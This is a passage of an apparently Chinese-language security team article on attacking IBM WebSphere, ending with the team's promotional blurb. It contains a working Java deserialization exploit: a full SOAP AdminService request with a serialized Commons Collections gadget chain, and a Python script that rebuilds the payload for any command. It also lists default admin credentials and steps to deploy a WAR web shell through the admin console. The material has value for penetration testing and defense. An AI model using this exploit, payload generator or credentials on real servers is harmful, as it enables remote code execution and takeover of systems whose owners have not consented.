xlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<objectname xsi:type="ns1:javax.management.ObjectName">rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==</objectname>
<operationname xsi:type="xsd:string">getUnsavedChanges</operationname>
<params xsi:type="ns1:[Ljava.lang.Object;">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABndob2FtaXQABGV4ZWN1cQB+AB4AAAABcQB+ACNzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAABB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA6
</params>
<signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
</ns1:invoke>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

Payload 执行的命令是 `whoami`

如果想要更改执行的命令，可通过如下代码，代码在 python3 下执行。

```
import base64
from binascii import unhexlify
command = "whoami"
serObj = unhexlify("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400")
serObj += (chr(len(command)) + command).encode('ascii')
serObj += unhexlify("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")
serObjB64 = base64.b64encode(serObj).decode()
print(serObjB64)
```

将输出的 serObjB64，替换到上面 Payload 中的 params 节点，其余无需改变。

```
<params xsi:type="ns1:[Ljava.lang.Object;">{serObjB64}</params>
```

### 8.2 弱口令 && 后台 Getshell

1.  在 6.x 至 7.0 版本，后台登陆只需要输入 admin 作为用户标识，无需密码，即可登陆后台。
    
2.  websphere/ websphere
    
3.  system/ manager
    

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vha8hWF4DSaCriczyvUhMm667NicfASrvQVOHFIzomoibu1IkAnTAjUtWKw/640?wx_fmt=png)

登录成功后选择应用程序类型 - WebSphere 企业应用程序 - install

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh3mdCfwAvfc6tZ6mav06EoSpjud0Mj0j7Q7YgP6R7rMY8ibiaQdjC0rZg/640?wx_fmt=png)

选择上传 war 包

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhNoGPibibARR8IRe66YhokVUDAhXT2hg3pONEaCibhtH5ibn89ia9yTr4sew/640?wx_fmt=png)

选择上下文名称

安装完成之后点击保存到主配置

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhCeUicibB8pd5nSy0ibibSlYk2pGhMBrGGAVfu30IT9leNr5A7mqxygdaww/640?wx_fmt=png)

选中上传的 war 包点击启动

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhqvlR6mMwDLgQskCHnicaU3T9gicTRaKBFsHCeibqFHAkcv89iaayHxvdVQ/640?wx_fmt=png)

访问 shell 地址：http://x.x.x.x:9080/tale/index.jsp

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室。团队公众号自创建以来，共发布原创文章 370 余篇，自研平台达到 26 个，目有 15 个平台已开源。此外积极参加各类线上、线下 CTF 比赛并取得了优异的成绩。如有对安全行业感兴趣的小伙伴可以踊跃加入或关注我们。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RX4MU7S4WB8R6vF3JbUjA7K0ZtOPxqGSo1HGPhTDicQibOro93UYNBOwRPd4EFseGTDsl1tan0ZXcmw/640?wx_fmt=gif)